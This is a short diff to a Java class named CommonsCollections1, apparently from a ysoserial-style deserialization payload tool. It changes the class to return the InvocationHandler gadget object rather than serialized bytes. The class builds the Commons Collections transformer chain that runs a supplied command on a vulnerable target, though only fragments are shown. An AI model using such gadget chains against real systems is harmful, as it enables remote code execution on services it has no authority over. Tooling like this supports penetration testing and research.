@@ -42,7 +42,7 @@ import java.util.Map;
  */
 public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public InvocationHandler getObject(PayloadType type, String... param) throws Exception {
         String command = param[0];
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
@@ -56,19 +56,7 @@ public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    out   = new ObjectOutputStream(baous);
-        out.writeObject(handler);
-        byte[] bytes = baous.toByteArray();
-        out.close();
-
-        return bytes;
-    }
-
-    @Override
-    public InvocationHandler getObject(String command) throws Exception {
-        return null;
+        return handler;
     }
 
     public static boolean isApplicableJavaVersion() {
